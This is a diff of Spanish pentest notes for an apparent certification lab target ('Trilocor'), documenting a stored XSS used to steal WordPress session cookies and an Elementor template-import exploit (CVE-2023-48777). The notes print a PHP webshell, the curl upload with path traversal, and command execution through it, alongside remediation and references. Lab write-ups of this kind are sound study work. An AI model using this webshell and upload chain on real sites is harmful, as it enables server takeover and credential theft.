@@ -1,5 +1,6 @@
 [[CWES]] [[Web Enumeración]] [[Web Explotación]] [[CWES - Checklist]]
 
+# Trilocor
 ## ip y hosts
 
 IP: 
@@ -106,7 +107,7 @@ http://www.trilocor.local/index.php/wp-json/
 y
 http://www.trilocor.local/index.php/wp-json/wp/v2/
 
-# Stored XSS
+## Stored XSS
 
 **Paso 1 — Leer el contenido real del sitio.**
 En la home hay una sección "Leave your testimonial". Su código fuente revela el endpoint. Se obtiene de dos formas equivalentes:
@@ -160,9 +161,9 @@ Abrí Cookie-Editor y creé dos cookies nuevas, una por cada una:
 - Nombre: `wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9` → Valor: `web-editor|1782144468|7XpTu09NZe1UJuzI94TtiASxkRuxxlMuFXaOhvD81Ul|0fdf700a49698a0b069a57498190bc8e2e24330b62d2ffa335171acc79196817`
 - Nombre: `wordpress_828ff7d64a441f8aab6a0310bdcee6a9` → Valor: `web-editor|1782144468|7XpTu09NZe1UJuzI94TtiASxkRuxxlMuFXaOhvD81Ul|3d54c85847ebb860dfb379cf8b55d0df6e650a57b24ebc1adcbc23912fd627e2`
 
-# Hallazgo: Remote Code Execution vía importación de plantillas de Elementor (CVE-2023-48777)
+## Hallazgo: Remote Code Execution vía importación de plantillas de Elementor (CVE-2023-48777)
 
-## Resumen
+### Resumen
 
 |Campo|Detalle|
 |---|---|
@@ -179,21 +180,21 @@ La función de importación de plantillas de Elementor procesa un parámetro `fi
 
 ---
 
-## Prerrequisito
+### Prerrequisito
 
 Se requiere una sesión autenticada con rol **Editor** (cumple el umbral Contributor+). En esta evaluación dicha sesión se obtuvo previamente mediante un **Stored XSS en el plugin a medida `secure_testimonials`**, que permitió robar la cookie de sesión del usuario `web-editor` (ver hallazgo correspondiente). Las cookies utilizadas a continuación son las de esa sesión.
 
 ---
 
-## Pasos de reproducción
+### Pasos de reproducción
 10.10.14.22
-### 1. Definir la sesión autenticada
+#### 1. Definir la sesión autenticada
 
 ```bash
 COOKIE='wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782155957%7CqP0CX69YENag9XhP37yAHV5ElveYZaVclxPglba8Gwe%7Ca33f9ccaf3183d5e54e722f4c67077c726443cfd947574b7a72230fcd0bb705c; wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782155957%7CqP0CX69YENag9XhP37yAHV5ElveYZaVclxPglba8Gwe%7C84a1f23a5cfb0099c09d7d152f58f1d9920cefa251994718010c3104ef8e2088'
 ```
 
-### 2. Obtener el nonce de Elementor
+#### 2. Obtener el nonce de Elementor
 
 Elementor publica el nonce para sus llamadas AJAX en la configuración embebida de cualquier página del editor. Se extrae con la sesión autenticada:
 ```bash
@@ -207,13 +208,13 @@ Salida esperada:
 Nonce: d0cab1a2f0
 ```
 
-### 3. Preparar el webshell en Base64
+#### 3. Preparar el webshell en Base64
 
 ```bash
 PAYLOAD=$(echo -n '<?php system($_GET[0]); ?>' | base64)
 ```
 
-### 4. Subir el webshell mediante el importador vulnerable
+#### 4. Subir el webshell mediante el importador vulnerable
 
 La petición se envía como POST `application/x-www-form-urlencoded` (no es un upload multipart). El archivo se escribe en el directorio temporal de Elementor; con `fileName=/../shell.php` el traversal lo deja en `wp-content/uploads/elementor/tmp/shell.php`.
 ```bash
@@ -229,7 +230,7 @@ curl -s -i -b "$COOKIE" 'http://admin.trilocor.local/wp-admin/admin-ajax.php' \
 
 > Nota: el 500 es la señal de éxito. El servidor escribe el archivo correctamente y luego falla al intentar procesar el contenido como una plantilla válida; ese error posterior produce el 500, pero el `.php` ya quedó en disco.
 
-### 5. Confirmar la ejecución remota de código
+#### 5. Confirmar la ejecución remota de código
 
 ```bash
 curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=id'
@@ -248,7 +249,7 @@ curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=c
 
 ---
 
-## Notas de ajuste del path traversal
+### Notas de ajuste del path traversal
 
 El directorio temporal real es un subdirectorio aleatorio dentro de `wp-content/uploads/elementor/tmp/`. La cantidad de `../` en `fileName` determina dónde aterriza el archivo:
 
@@ -262,13 +263,13 @@ Si una ruta devuelve 404, reintentar la subida (paso 4) y solicitar el archivo i
 
 ---
 
-## Impacto
+### Impacto
 
 Compromiso total del servidor web. Un usuario con privilegios mínimos de edición (Editor/Contributor) obtiene ejecución de comandos como `www-data`, lo que habilita: lectura de `wp-config.php` y credenciales de base de datos, lectura de la flag, establecimiento de una reverse shell y enumeración para escalada de privilegios local.
 
 ---
 
-## Remediación
+### Remediación
 
 - **Actualizar Elementor a la versión 3.18.2 o superior**, donde la subida arbitraria y el path traversal están corregidos.
 - Aplicar el principio de mínimo privilegio: revisar qué roles tienen acceso a Elementor.
@@ -277,9 +278,12 @@ Compromiso total del servidor web. Un usuario con privilegios mínimos de edici�
 
 ---
 
-## Referencias
+### Referencias
 
 - CVE-2023-48777 — Wordfence: _Elementor ≤ 3.18.1 — Authenticated (Contributor+) Arbitrary File Upload to RCE via Template Import_
 - WPScan Vulnerability Database: `a6b3b14c-f06b-4506-9b88-854f155ebca9`
 - Patchstack — _Critical Vulnerability in Elementor Affecting 5+ Million Websites_
 - Investigador original: Hồng Quân (2023-12-06)
+
+# Recursos Humanos
+
